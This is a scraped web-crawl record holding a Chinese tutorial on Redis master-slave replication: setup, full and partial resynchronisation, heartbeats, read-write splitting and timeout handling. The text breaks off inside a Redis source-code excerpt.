jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"url_object_id": "aa95d1c9ae4721218650bfa651e5af8c", "title": ["深入学习 Redis（3）：主从复制"], "url": "http://blog.jobbole.com/114194/", "create_date": "2018/07/05", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 0, "tags": "IT技术, Redis, 数据库", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a target=\"_blank\" href=\"http://www.cnblogs.com/kismetv/p/9236731.html\">编程迷思</a>   </div><h2>前言</h2>\n<p>在前面的两篇文章中，分别介绍了<a href=\"http://blog.jobbole.com/113789/\" target=\"_blank\">Redis的内存模型</a>和<a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">Redis的持久化</a>。</p>\n<p>在Redis的持久化中曾提到，Redis高可用的方案包括持久化、主从复制（及读写分离）、哨兵和集群。其中持久化侧重解决的是Redis数据的单机备份问题（从内存到硬盘的备份）；而主从复制则侧重解决数据的多机热备。此外，主从复制还可以实现负载均衡和故障恢复。</p>\n<p>这篇文章中，将详细介绍Redis主从复制的方方面面，包括：如何使用主从复制、主从复制的原理（重点是全量复制和部分复制、以及心跳机制）、实际应用中需要注意的问题（如数据不一致问题、复制超时问题、复制缓冲区溢出问题）、主从复制相关的配置（重点是repl-timeout、client-output-buffer-limit slave）等。</p>\n<h1>一、主从复制概述</h1>\n<p>主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。</p>\n<p>默认情况下，每台Redis服务器都是主节点；且一个主节点可以有多个从节点(或没有从节点)，但一个从节点只能有一个主节点。</p>\n<p><strong>主从复制的作用</strong></p>\n<p>主从复制的作用主要包括：</p>\n<ol>\n<li>数据冗余：主从复制实现了数据的热备份，是持久化之外的一种数据冗余方式。</li>\n<li>故障恢复：当主节点出现问题时，可以由从节点提供服务，实现快速的故障恢复；实际上是一种服务的冗余。</li>\n<li>负载均衡：在主从复制的基础上，配合读写分离，可以由主节点提供写服务，由从节点提供读服务（即写Redis数据时应用连接主节点，读Redis数据时应用连接从节点），分担服务器负载；尤其是在写少读多的场景下，通过多个从节点分担读负载，可以大大提高Redis服务器的并发量。</li>\n<li>高可用基石：除了上述作用以外，主从复制还是哨兵和集群能够实施的基础，因此说主从复制是Redis高可用的基础。</li>\n</ol>\n<h1>二、如何使用主从复制</h1>\n<p>为了更直观的理解主从复制，在介绍其内部原理之前，先说明我们需要如何操作才能开启主从复制。</p>\n<h2>1. 建立复制</h2>\n<p>需要注意，<strong>主从复制的开启，完全是在从节点发起的；不需要我们在主节点做任何事情。</strong></p>\n<p>从节点开启主从复制，有3种方式：</p>\n<p>（1）配置文件</p>\n<p>在从服务器的配置文件中加入：slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n<p>（2）启动命令</p>\n<p>redis-server启动命令后加入 –slaveof &lt;masterip&gt; &lt;masterport&gt;</p>\n<p>（3）客户端命令</p>\n<p>Redis服务器启动后，直接通过客户端执行命令：slaveof &lt;masterip&gt; &lt;masterport&gt;，则该Redis实例成为从节点。</p>\n<p>上述3种方式是等效的，下面以客户端命令的方式为例，看一下当执行了slaveof后，Redis主节点和从节点的变化。</p>\n<h2>2. 实例</h2>\n<h3>准备工作：启动两个节点</h3>\n<p>方便起见，实验所使用的主从节点是在一台机器上的不同Redis实例，其中主节点监听6379端口，从节点监听6380端口；从节点监听的端口号可以在配置文件中修改：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/f8bd402c8f2c061e530425c73a3ca8a3.png\" alt=\"\"></p>\n<p>启动后可以看到：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6086f737e5512ad04968c73ccfd825eb.png\" alt=\"\"></p>\n<p>两个Redis节点启动后（分别称为6379节点和6380节点），默认都是主节点。</p>\n<h3>建立复制</h3>\n<p>此时在6380节点执行slaveof命令，使之变为从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/52a970ef1267bd05592c3eaf1f6adbb5.png\" alt=\"\"></p>\n<h3>观察效果</h3>\n<p>下面验证一下，在主从复制建立后，主节点的数据会复制到从节点中。</p>\n<p>（1）首先在从节点查询一个不存在的key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/1b0f72f0a25b24ae841a94ebcab8aff3.png\" alt=\"\"></p>\n<p>（2）然后在主节点中增加这个key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6ea8e7f7f1e7e7366f01ae2826a156cb.png\" alt=\"\"></p>\n<p>（3）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/568a21042ea667791b9ded398157ea9e.png\" alt=\"\"></p>\n<p>（4）然后在主节点删除这个key：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/a5374ed7f3c9561b164960079fb1a4a2.png\" alt=\"\"></p>\n<p>（5）此时在从节点中再次查询这个key，会发现主节点的操作已经同步至从节点：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/69f2bbaf2104ed754714c1b9c7c130a2.png\" alt=\"\"></p>\n<h2>3. 断开复制</h2>\n<p>通过slaveof &lt;masterip&gt; &lt;masterport&gt;命令建立主从复制关系以后，可以通过slaveof no one断开。需要注意的是，从节点断开复制后，不会删除已有的数据，只是不再接受主节点新的数据变化。</p>\n<p>从节点执行slaveof no one后，打印日志如下所示；可以看出断开复制后，从节点又变回为主节点。</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/26021476cbfc7cc0057ec1705832bbb5.png\" alt=\"\"></p>\n<p>主节点打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/068ea8d21fff8628cb3a083e021cf01e.png\" alt=\"\"></p>\n<h1>三、主从复制的实现原理</h1>\n<p>上面一节中，介绍了如何操作可以建立主从关系；本小节将介绍主从复制的实现原理。</p>\n<p>主从复制过程大体可以分为3个阶段：连接建立阶段（即准备阶段）、数据同步阶段、命令传播阶段；下面分别进行介绍。</p>\n<h2>1. 连接建立阶段</h2>\n<p>该阶段的主要作用是在主从节点之间建立连接，为数据同步做好准备。</p>\n<h3>步骤1：保存主节点信息</h3>\n<p>从节点服务器内部维护了两个字段，即masterhost和masterport字段，用于存储主节点的ip和port信息。</p>\n<p>需要注意的是，<strong>slaveof</strong><strong>是异步命令，从节点完成主节点ip</strong><strong>和port</strong><strong>的保存后，向发送slaveof</strong><strong>命令的客户端直接返回OK</strong><strong>，实际的复制操作在这之后才开始进行。</strong></p>\n<p>这个过程中，可以看到从节点打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/91ae1117c30e1084ea85c3a44be915ab.png\" alt=\"\"></p>\n<h3>步骤2：建立socket连接</h3>\n<p>从节点每秒1次调用复制定时函数replicationCron()，如果发现了有主节点可以连接，便会根据主节点的ip和port，创建socket连接。如果连接成功，则：</p>\n<p>从节点：为该socket建立一个专门处理复制工作的文件事件处理器，负责后续的复制工作，如接收RDB文件、接收命令传播等。</p>\n<p>主节点：接收到从节点的socket连接后（即accept之后），为该socket创建相应的客户端状态，<strong>并将从节点看做是连接到主节点的一个客户端，后面的步骤会以从节点向主节点发送命令请求的形式来进行。</strong></p>\n<p>这个过程中，从节点打印日志如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/161e84d3812ffe96a64c49b818e16d9b.png\" alt=\"\"></p>\n<h3>步骤3：发送ping命令</h3>\n<p>从节点成为主节点的客户端之后，发送ping命令进行首次请求，目的是：检查socket连接是否可用，以及主节点当前是否能够处理请求。</p>\n<p>从节点发送ping命令后，可能出现3种情况：</p>\n<p>（1）返回pong：说明socket连接正常，且主节点当前可以处理请求，复制过程继续。</p>\n<p>（2）超时：一定时间后从节点仍未收到主节点的回复，说明socket连接不可用，则从节点断开socket连接，并重连。</p>\n<p>（3）返回pong以外的结果：如果主节点返回其他结果，如正在处理超时运行的脚本，说明主节点当前无法处理命令，则从节点断开socket连接，并重连。</p>\n<p>在主节点返回pong情况下，从节点打印日志如下：</p>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9f778e5fa051775c362d32c8b6ca745e.png\" alt=\"\"></p>\n<h3>步骤4：身份验证</h3>\n<p>如果从节点中设置了masterauth选项，则从节点需要向主节点进行身份验证；没有设置该选项，则不需要验证。从节点进行身份验证是通过向主节点发送auth命令进行的，auth命令的参数即为配置文件中的masterauth的值。</p>\n<p>如果主节点设置密码的状态，与从节点masterauth的状态一致（一致是指都存在，且密码相同，或者都不存在），则身份验证通过，复制过程继续；如果不一致，则从节点断开socket连接，并重连。</p>\n<h3>步骤5：发送从节点端口信息</h3>\n<p>身份验证之后，从节点会向主节点发送其监听的端口号（前述例子中为6380），主节点将该信息保存到该从节点对应的客户端的slave_listening_port字段中；该端口信息除了在主节点中执行info Replication时显示以外，没有其他作用。</p>\n<h2>2. 数据同步阶段</h2>\n<p>主从节点之间的连接建立以后，便可以开始进行数据同步，该阶段可以理解为从节点数据的初始化。具体执行的方式是：从节点向主节点发送psync命令（Redis2.8以前是sync命令），开始同步。</p>\n<p>数据同步阶段是主从复制最核心的阶段，根据主从节点当前状态的不同，可以分为全量复制和部分复制，下面会有一章专门讲解这两种复制方式以及psync命令的执行过程，这里不再详述。</p>\n<p>需要注意的是，在数据同步阶段之前，从节点是主节点的客户端，主节点不是从节点的客户端；而到了这一阶段及以后，主从节点互为客户端。原因在于：在此之前，主节点只需要响应从节点的请求即可，不需要主动发请求，而在数据同步阶段和后面的命令传播阶段，主节点需要主动向从节点发送请求（如推送缓冲区中的写命令），才能完成复制。</p>\n<h2>3. 命令传播阶段</h2>\n<p>数据同步阶段完成后，主从节点进入命令传播阶段；在这个阶段主节点将自己执行的写命令发送给从节点，从节点接收命令并执行，从而保证主从节点数据的一致性。</p>\n<p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。由于心跳机制的原理涉及部分复制，因此将在介绍了部分复制的相关内容后单独介绍该心跳机制。</p>\n<p><strong>延迟与不一致</strong></p>\n<p>需要注意的是，命令传播是异步的过程，即主节点发送写命令后并不会等待从节点的回复；因此实际上主从节点之间很难保持实时的一致性，延迟在所难免。数据不一致的程度，与主从节点之间的网络状况、主节点写命令的执行频率、以及主节点中的repl-disable-tcp-nodelay配置等有关。</p>\n<p>repl-disable-tcp-nodelay no：该配置作用于命令传播阶段，控制主节点是否禁止与从节点的TCP_NODELAY；默认no，即不禁止TCP_NODELAY。当设置为yes时，TCP会对包进行合并从而减少带宽，但是发送的频率会降低，从节点数据延迟增加，一致性变差；具体发送频率与Linux内核的配置有关，默认配置为40ms。当设置为no时，TCP会立马将主节点的数据发送给从节点，带宽增加但延迟变小。</p>\n<p>一般来说，只有当应用对Redis数据不一致的容忍度较高，且主从节点之间网络状况不好时，才会设置为yes；多数情况使用默认值no。</p>\n<h1>四、【数据同步阶段】全量复制和部分复制</h1>\n<p>在Redis2.8以前，从节点向主节点发送sync命令请求同步数据，此时的同步方式是全量复制；在Redis2.8及以后，从节点可以发送psync命令请求同步数据，此时根据主从节点当前状态的不同，同步方式可能是全量复制或部分复制。后文介绍以Redis2.8及以后版本为例。</p>\n<ol>\n<li>全量复制：用于初次复制或其他无法进行部分复制的情况，将主节点中的所有数据都发送给从节点，是一个非常重型的操作。</li>\n<li>部分复制：用于网络中断等情况后的复制，只将中断期间主节点执行的写命令发送给从节点，与全量复制相比更加高效。需要注意的是，如果网络中断时间过长，导致主节点没有能够完整地保存中断期间执行的写命令，则无法进行部分复制，仍使用全量复制。</li>\n</ol>\n<h2>1. 全量复制</h2>\n<p>Redis通过psync命令进行全量复制的过程如下：</p>\n<p>（1）从节点判断无法进行部分复制，向主节点发送全量复制的请求；或从节点发送部分复制的请求，但主节点判断无法进行全量复制；具体判断过程需要在讲述了部分复制原理后再介绍。</p>\n<p>（2）主节点收到全量复制的命令后，执行bgsave，在后台生成RDB文件，并使用一个缓冲区（称为复制缓冲区）记录从现在开始执行的所有写命令</p>\n<p>（3）主节点的bgsave执行完成后，将RDB文件发送给从节点；<strong>从节点首先清除自己的旧数据，然后载入接收的</strong><strong>RDB</strong><strong>文件</strong>，将数据库状态更新至主节点执行bgsave时的数据库状态</p>\n<p>（4）主节点将前述复制缓冲区中的所有写命令发送给从节点，从节点执行这些写命令，将数据库状态更新至主节点的最新状态</p>\n<p>（5）如果从节点开启了AOF，则会触发bgrewriteaof的执行，从而保证AOF文件更新至主节点的最新状态</p>\n<p>下面是执行全量复制时，主从节点打印的日志；可以看出日志内容与上述步骤是完全对应的。</p>\n<p>主节点的打印日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/53f6cbf8a51c88138c65167cf4fe7e0c.png\" alt=\"\"></p>\n<p>从节点打印日志如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ed55e49faf7e91f04d1a4f4c4b00e11b.png\" alt=\"\"></p>\n<p>其中，有几点需要注意：从节点接收了来自主节点的89260个字节的数据；从节点在载入主节点的数据之前要先将老数据清除；从节点在同步完数据后，调用了bgrewriteaof。</p>\n<p>通过全量复制的过程可以看出，全量复制是非常重型的操作：</p>\n<p>（1）主节点通过bgsave命令fork子进程进行RDB持久化，该过程是非常消耗CPU、内存(页表复制)、硬盘IO的；关于bgsave的性能问题，可以参考 <a href=\"http://blog.jobbole.com/114093/\" target=\"_blank\">深入学习Redis（2）：持久化</a></p>\n<p>（2）主节点通过网络将RDB文件发送给从节点，对主从节点的带宽都会带来很大的消耗</p>\n<p>（3）从节点清空老数据、载入新RDB文件的过程是阻塞的，无法响应客户端的命令；如果从节点执行bgrewriteaof，也会带来额外的消耗</p>\n<h2>2. 部分复制</h2>\n<p>由于全量复制在主节点数据量较大时效率太低，因此Redis2.8开始提供部分复制，用于处理网络中断时的数据同步。</p>\n<p>部分复制的实现，依赖于三个重要的概念：</p>\n<h3>（1）复制偏移量</h3>\n<p>主节点和从节点分别维护一个复制偏移量（offset），代表的是<strong>主节点向从节点传递的字节数</strong>；主节点每次向从节点传播N个字节数据时，主节点的offset增加N；从节点每次收到主节点传来的N个字节数据时，从节点的offset增加N。</p>\n<p>offset用于判断主从节点的数据库状态是否一致：如果二者offset相同，则一致；如果offset不同，则不一致，此时可以根据两个offset找出从节点缺少的那部分数据。例如，如果主节点的offset是1000，而从节点的offset是500，那么部分复制就需要将offset为501-1000的数据传递给从节点。而offset为501-1000的数据存储的位置，就是下面要介绍的复制积压缓冲区。</p>\n<h3>（2）复制积压缓冲区</h3>\n<p>复制积压缓冲区是由主节点维护的、固定长度的、先进先出(FIFO)队列，默认大小1MB；当主节点开始有从节点时创建，其作用是备份主节点最近发送给从节点的数据。注意，无论主节点有一个还是多个从节点，都只需要一个复制积压缓冲区。</p>\n<p>在命令传播阶段，主节点除了将写命令发送给从节点，还会发送一份给复制积压缓冲区，作为写命令的备份；除了存储写命令，复制积压缓冲区中还存储了其中的每个字节对应的复制偏移量（offset）。由于复制积压缓冲区定长且是先进先出，所以它保存的是主节点最近执行的写命令；时间较早的写命令会被挤出缓冲区。</p>\n<p>由于该缓冲区长度固定且有限，因此可以备份的写命令也有限，当主从节点offset的差距过大超过缓冲区长度时，将无法执行部分复制，只能执行全量复制。反过来说，为了提高网络中断时部分复制执行的概率，可以根据需要增大复制积压缓冲区的大小(通过配置repl-backlog-size)；例如如果网络中断的平均时间是60s，而主节点平均每秒产生的写命令(特定协议格式)所占的字节数为100KB，则复制积压缓冲区的平均需求为6MB，保险起见，可以设置为12MB，来保证绝大多数断线情况都可以使用部分复制。</p>\n<p>从节点将offset发送给主节点后，主节点根据offset和缓冲区大小决定能否执行部分复制：</p>\n<ul>\n<li>如果offset偏移量之后的数据，仍然都在复制积压缓冲区里，则执行部分复制；</li>\n<li>如果offset偏移量之后的数据已不在复制积压缓冲区中（数据已被挤出），则执行全量复制。</li>\n</ul>\n<h3>（3）服务器运行ID(runid)</h3>\n<p>每个Redis节点(无论主从)，在启动时都会自动生成一个随机ID(每次启动都不一样)，由40个随机的十六进制字符组成；runid用来唯一识别一个Redis节点。通过info Server命令，可以查看节点的runid：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/9d9f5a1f900cc62a58b99c84afceb108.png\" alt=\"\"></p>\n<p>主从节点初次复制时，主节点将自己的runid发送给从节点，从节点将这个runid保存起来；当断线重连时，从节点会将这个runid发送给主节点；主节点根据runid判断能否进行部分复制：</p>\n<ul>\n<li>如果从节点保存的runid与主节点现在的runid相同，说明主从节点之前同步过，主节点会继续尝试使用部分复制(到底能不能部分复制还要看offset和复制积压缓冲区的情况)；</li>\n<li>如果从节点保存的runid与主节点现在的runid不同，说明从节点在断线前同步的Redis节点并不是当前的主节点，只能进行全量复制。</li>\n</ul>\n<h2>3. psync命令的执行</h2>\n<p>在了解了复制偏移量、复制积压缓冲区、节点运行id之后，本节将介绍psync命令的参数和返回值，从而说明psync命令执行过程中，主从节点是如何确定使用全量复制还是部分复制的。</p>\n<p>psync命令的执行过程可以参见下图（图片来源：《Redis设计与实现》）：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/539735ab6935ec04a11e4eae532473b4.png\" alt=\"\"></p>\n<p>（1）首先，从节点根据当前状态，决定如何调用psync命令：</p>\n<ul>\n<li>如果从节点之前未执行过slaveof或最近执行了slaveof no one，则从节点发送命令为psync ? -1，向主节点请求全量复制；</li>\n<li>如果从节点之前执行了slaveof，则发送命令为psync &lt;runid&gt; &lt;offset&gt;，其中runid为上次复制的主节点的runid，offset为上次复制截止时从节点保存的复制偏移量。</li>\n</ul>\n<p>（2）主节点根据收到的psync命令，及当前服务器状态，决定执行全量复制还是部分复制：</p>\n<ul>\n<li>如果主节点版本低于Redis2.8，则返回-ERR回复，此时从节点重新发送sync命令执行全量复制；</li>\n<li>如果主节点版本够新，且runid与从节点发送的runid相同，且从节点发送的offset之后的数据在复制积压缓冲区中都存在，则回复+CONTINUE，表示将进行部分复制，从节点等待主节点发送其缺少的数据即可；</li>\n<li>如果主节点版本够新，但是runid与从节点发送的runid不同，或从节点发送的offset之后的数据已不在复制积压缓冲区中(在队列中被挤出了)，则回复+FULLRESYNC &lt;runid&gt; &lt;offset&gt;，表示要进行全量复制，其中runid表示主节点当前的runid，offset表示主节点当前的offset，从节点保存这两个值，以备使用。</li>\n</ul>\n<h2>4. 部分复制演示</h2>\n<p>在下面的演示中，网络中断几分钟后恢复，断开连接的主从节点进行了部分复制；为了便于模拟网络中断，本例中的主从节点在局域网中的两台机器上。</p>\n<p><strong>网络中断</strong></p>\n<p>网络中断一段时间后，主节点和从节点都会发现失去了与对方的连接（关于主从节点对超时的判断机制，后面会有说明）；此后，从节点便开始执行对主节点的重连，由于此时网络还没有恢复，重连失败，从节点会一直尝试重连。</p>\n<p>主节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/02bba87c0eb1a8af6f181ae3c99e1ab2.png\" alt=\"\"></p>\n<p>从节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/417f7451c637e34e8ea8727df6140920.png\" alt=\"\"></p>\n<p><strong>网络恢复</strong></p>\n<p>网络恢复后，从节点连接主节点成功，并请求进行部分复制，主节点接收请求后，二者进行部分复制以同步数据。</p>\n<p>主节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/1600a7bbcdfc26e6bb286885f84f3353.png\" alt=\"\"></p>\n<p>从节点日志如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ad33fbcc87156992bb9ffc7a45c18032.png\" alt=\"\"></p>\n<h1>五、【命令传播阶段】心跳机制</h1>\n<p>在命令传播阶段，除了发送写命令，主从节点还维持着心跳机制：PING和REPLCONF ACK。心跳机制对于主从复制的超时判断、数据安全等有作用。</p>\n<h2>1.主-&gt;从：PING</h2>\n<p>每隔指定的时间，<strong>主节点会向从节点发送</strong><strong>PING</strong><strong>命令</strong>，这个PING命令的作用，主要是为了让从节点进行超时判断。</p>\n<p>PING发送的频率由repl-ping-slave-period参数控制，单位是秒，默认值是10s。</p>\n<p>关于该PING命令究竟是由主节点发给从节点，还是相反，有一些争议；因为在Redis的官方文档中，对该参数的注释中说明是从节点向主节点发送PING命令，如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/15bc8cfb447fd80e86a47ba186441f6d.png\" alt=\"\"></p>\n<p>但是根据该参数的名称(含有ping-slave)，以及代码实现，我认为该PING命令是主节点发给从节点的。相关代码如下：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/6aecaca87b37a8733c5dad783a80c2b0.png\" alt=\"\"></p>\n<h2>2. 从-&gt;主：REPLCONF ACK</h2>\n<p>在命令传播阶段，<strong>从节点会向主节点发送</strong><strong>REPLCONF ACK</strong><strong>命令，</strong>频率是每秒1次；命令格式为：REPLCONF ACK {offset}，其中offset指从节点保存的复制偏移量。REPLCONF ACK命令的作用包括：</p>\n<p>（1）实时监测主从节点网络状态：该命令会被主节点用于复制超时的判断。此外，在主节点中使用info Replication，可以看到其从节点的状态中的lag值，代表的是主节点上次收到该REPLCONF ACK命令的时间间隔，在正常情况下，该值应该是0或1，如下图所示：</p>\n<p><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/07/ad2eb70149ddbd2771b606ea69192084.png\" alt=\"\"></p>\n<p>（2）检测命令丢失：从节点发送了自身的offset，主节点会与自己的offset对比，如果从节点数据缺失（如网络丢包），主节点会推送缺失的数据（这里也会利用复制积压缓冲区）。<strong>注意，</strong><strong>offset</strong><strong>和复制积压缓冲区，不仅可以用于部分复制，也可以用于处理命令丢失等情形；区别在于前者是在断线重连后进行的，而后者是在主从节点没有断线的情况下进行的。</strong></p>\n<p>（3）辅助保证从节点的数量和延迟：Redis主节点中使用min-slaves-to-write和min-slaves-max-lag参数，来保证主节点在不安全的情况下不会执行写命令；所谓不安全，是指从节点数量太少，或延迟过高。例如min-slaves-to-write和min-slaves-max-lag分别是3和10，含义是如果从节点数量小于3个，或所有从节点的延迟值都大于10s，则主节点拒绝执行写命令。而这里从节点延迟值的获取，就是通过主节点接收到REPLCONF ACK命令的时间来判断的，即前面所说的info Replication中的lag值。</p>\n<h1>六、应用中的问题</h1>\n<h2>1. 读写分离及其中的问题</h2>\n<p>在主从复制基础上实现的读写分离，可以实现Redis的读负载均衡：由主节点提供写服务，由一个或多个从节点提供读服务（多个从节点既可以提高数据冗余程度，也可以最大化读负载能力）；在读负载较大的应用场景下，可以大大提高Redis服务器的并发量。下面介绍在使用Redis读写分离时，需要注意的问题。</p>\n<h3>（1）延迟与不一致问题</h3>\n<p>前面已经讲到，由于主从复制的命令传播是异步的，延迟与数据的不一致不可避免。如果应用对数据不一致的接受程度程度较低，可能的优化措施包括：优化主从节点之间的网络环境（如在同机房部署）；监控主从节点延迟（通过offset）判断，如果从节点延迟过大，通知应用不再通过该从节点读取数据；使用集群同时扩展写负载和读负载等。</p>\n<p>在命令传播阶段以外的其他情况下，从节点的数据不一致可能更加严重，例如连接在数据同步阶段，或从节点失去与主节点的连接时等。从节点的slave-serve-stale-data参数便与此有关：它控制这种情况下从节点的表现；如果为yes（默认值），则从节点仍能够响应客户端的命令，如果为no，则从节点只能响应info、slaveof等少数命令。该参数的设置与应用对数据一致性的要求有关；如果对数据一致性要求很高，则应设置为no。</p>\n<h3>（2）数据过期问题</h3>\n<p>在单机版Redis中，存在两种删除策略：</p>\n<ul>\n<li>惰性删除：服务器不会主动删除数据，只有当客户端查询某个数据时，服务器判断该数据是否过期，如果过期则删除。</li>\n<li>定期删除：服务器执行定时任务删除过期数据，但是考虑到内存和CPU的折中（删除会释放内存，但是频繁的删除操作对CPU不友好），该删除的频率和执行时间都受到了限制。</li>\n</ul>\n<p>在主从复制场景下，为了主从节点的数据一致性，从节点不会主动删除数据，而是由主节点控制从节点中过期数据的删除。由于主节点的惰性删除和定期删除策略，都不能保证主节点及时对过期数据执行删除操作，因此，当客户端通过Redis从节点读取数据时，很容易读取到已经过期的数据。</p>\n<p>Redis 3.2中，从节点在读取数据时，增加了对数据是否过期的判断：如果该数据已过期，则不返回给客户端；将Redis升级到3.2可以解决数据过期问题。</p>\n<h3>（3）故障切换问题</h3>\n<p>在没有使用哨兵的读写分离场景下，应用针对读和写分别连接不同的Redis节点；当主节点或从节点出现问题而发生更改时，需要及时修改应用程序读写Redis数据的连接；连接的切换可以手动进行，或者自己写监控程序进行切换，但前者响应慢、容易出错，后者实现复杂，成本都不算低。</p>\n<h3>（4）总结</h3>\n<p>在使用读写分离之前，可以考虑其他方法增加Redis的读负载能力：如尽量优化主节点（减少慢查询、减少持久化等其他情况带来的阻塞等）提高负载能力；使用Redis集群同时提高读负载能力和写负载能力等。如果使用读写分离，可以使用哨兵，使主从节点的故障切换尽可能自动化，并减少对应用程序的侵入。</p>\n<h2>2. 复制超时问题</h2>\n<p>主从节点复制超时是导致复制中断的最重要的原因之一，本小节单独说明超时问题，下一小节说明其他会导致复制中断的问题。</p>\n<p><strong>超时判断意义</strong></p>\n<p>在复制连接建立过程中及之后，主从节点都有机制判断连接是否超时，其意义在于：</p>\n<p>（1）如果主节点判断连接超时，其会释放相应从节点的连接，从而释放各种资源，否则无效的从节点仍会占用主节点的各种资源（输出缓冲区、带宽、连接等）；此外连接超时的判断可以让主节点更准确的知道当前有效从节点的个数，有助于保证数据安全（配合前面讲到的min-slaves-to-write等参数）。</p>\n<p>（2）如果从节点判断连接超时，则可以及时重新建立连接，避免与主节点数据长期的不一致。</p>\n<p><strong>判断机制</strong></p>\n<p>主从复制超时判断的核心，在于repl-timeout参数，该参数规定了超时时间的阈值（默认60s），对于主节点和从节点同时有效；主从节点触发超时的条件分别如下：</p>\n<p>（1）主节点：每秒1次调用复制定时函数replicationCron()，在其中判断当前时间距离上次收到各个从节点REPLCONF ACK的时间，是否超过了repl-timeout值，如果超过了则释放相应从节点的连接。</p>\n<p>（2）从节点：从节点对超时的判断同样是在复制定时函数中判断，基本逻辑是：</p>\n<ul>\n<li>如果当前处于连接建立阶段，且距离上次收到主节点的信息的时间已超过repl-timeout，则释放与主节点的连接；</li>\n<li>如果当前处于数据同步阶段，且收到主节点的RDB文件的时间超时，则停止数据同步，释放连接；</li>\n<li>如果当前处于命令传播阶段，且距离上次收到主节点的PING命令或数据的时间已超过repl-timeout值，则释放与主节点的连接。</li>\n</ul>\n<p>主从节点判断连接超时的相关源代码如下：</p>\n<div>\n<!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b625d682b5d0019610953\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n/* Replication cron function, called 1 time per second. */\r\nvoid replicationCron(void) {\r\n    static long long replication_cron_loops = 0;\r\n\r\n    /* Non blocking connection timeout? */\r\n    if (server.masterhost &amp;&amp;\r\n        (server.repl_state == REDIS_REPL_CONNECTING ||\r\n         slaveIsInHandshakeState()) &amp;&amp;\r\n         (time(NULL)-server.repl_transfer_lastio) &gt; server.repl_timeout)\r\n    